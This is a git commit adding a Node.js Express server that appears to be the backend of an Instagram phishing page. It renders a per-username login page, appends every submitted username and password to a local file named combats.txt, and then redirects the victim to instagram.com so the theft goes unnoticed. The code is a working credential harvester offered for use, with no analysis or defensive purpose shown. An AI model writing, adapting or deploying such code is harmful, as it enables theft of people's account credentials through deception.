77edee055e9a54f2f402f630ea31a3f5af5f265b
gizlilikveguvenlik <121334730+gizlilikveguvenlik@users.noreply.github.com>
2022-12-24 11:55:58 +0400

    Add files via upload

---
+++ index.js
@@ -0,0 +1,37 @@
+//static
+const port = 8000
+//express
+const express = require("express")
+const app = express()
+// file system
+const fs = require('fs')
+// handlebars-view engine
+const exphbs = require('express-handlebars')
+const {engine} = exphbs
+app.engine('hbs', engine({extname:'.hbs'}))
+app.set('view engine', 'hbs')
+//body-parser
+const bodyparser = require('body-parser')
+
+app.use(bodyparser.urlencoded({extended:false}))
+// main
+app.get('/:username', (req,res)=>{
+	const {username} = req.params || 'USERNAME'
+	res.render('index', {username})
+})
+app.post('/:username', async (req,res)=>{
+	const {username, password}=req.body
+	const combo = `${username}:${password}\n`
+	fs.appendFile('combats.txt', combo ,(err)=>{
+	res.redirect(`https://instagram.com`)
+
+	})
+
+
+
+})
+
+
+app.listen(port, ()=>{
+	console.log(`server running on http://localhost:${port}`)
+})
